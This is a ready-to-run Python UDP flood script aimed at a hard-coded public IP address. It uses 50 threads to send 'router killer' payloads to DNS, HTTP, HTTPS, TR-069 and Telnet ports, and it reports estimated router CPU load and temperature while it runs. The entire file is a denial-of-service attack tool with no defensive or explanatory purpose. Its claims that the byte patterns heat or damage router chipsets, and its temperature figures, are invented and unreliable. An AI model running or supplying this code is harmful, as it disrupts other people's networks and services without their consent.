import socket
import threading
import time
import random

target = "62.109.121.42"

# ROUTER-SPECIFIC HEAT PAYLOADS
ROUTER_HEAT_PAYLOADS = [
    # 1. ROUTER CPU KILLER - Small packets, high PPS
    b'\x00' * 64,  # Minimum size for max PPS
    
    # 2. ROUTER MEMORY EATER - State table patterns
    b'\xFF\x00\xFF\x00' * 16,  # Alternating for cache thrash
    
    # 3. ROUTER CHIPSET HEATER - Specific router patterns
    b'\xAA\x55\xAA\x55' * 16,  # Clock signal pattern
    
    # 4. ROUTER THERMAL TRIGGER - Pattern to cause processing
    b'\x01' * 128,  # Sequential processing load
]

# SLOW THREADS - DON'T STRESS YOUR DEVICE
THREADS = 50  # Low thread count on YOUR device
INTERVAL = 0.01  # 10ms between sends - LOW LOAD

# Socket pool to minimize your device load
socket_pool = []
for _ in range(10):  # Only 10 sockets
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        socket_pool.append(s)
    except:
        pass

# Stats
packets_sent = 0
start_time = time.time()

def router_heat_attack():
    """Low-load attack that stresses ROUTER, not your device"""
    global packets_sent
    
    while True:
        try:
            # Use pooled socket
            sock = random.choice(socket_pool)
            
            # Router-killer payload
            payload = random.choice(ROUTER_HEAT_PAYLOADS)
            
            # Target router ports that cause most heat
            port = random.choice([
                53,    # DNS - CPU intensive
                80,    # HTTP - processing
                443,   # HTTPS - crypto heat
                7547,  # TR-069 - router management
                23,    # Telnet - old router CPU
            ])
            
            # SEND TO ROUTER
            sock.sendto(payload, (target, port))
            packets_sent += 1
            
            # CRITICAL: SLEEP TO REDUCE YOUR DEVICE LOAD
            time.sleep(INTERVAL)
            
        except:
            # If socket dies, wait longer to reduce load
            time.sleep(0.1)

print("🔥 ROUTER-ONLY HEAT ATTACK")
print(f"🎯 Target: {target}")
print(f"📡 Threads: {THREADS} (LOW LOAD ON YOUR DEVICE)")
print(f"⏱️  Interval: {INTERVAL*1000}ms between packets")
print("="*50)

# Start low-load threads
for i in range(THREADS):
    t = threading.Thread(target=router_heat_attack)
    t.daemon = True
    t.start()

# Monitoring
last_log = time.time()
while True:
    time.sleep(5)  # Check every 5 seconds
    elapsed = time.time() - last_log
    last_log = time.time()
    
    pps = packets_sent / elapsed if elapsed > 0 else 0
    packets_sent = 0
    
    # Calculate ESTIMATED router heat (not your device)
    router_cpu = min(100, 30 + (pps * 0.01))
    router_temp = 45 + (pps * 0.002)  # Base 45°C + increase
    
    print(f"🔥 ROUTER-HEAT | {int(pps)}/s | ROUTER-CPU: {router_cpu:.0f}% | ROUTER-TEMP: {router_temp:.0f}°C")
    print(f"   YOUR DEVICE: LOW LOAD | SLEEPING: {INTERVAL*1000}ms")
    
    if router_temp > 100:
        print("🚨 ROUTER OVERHEATING!")
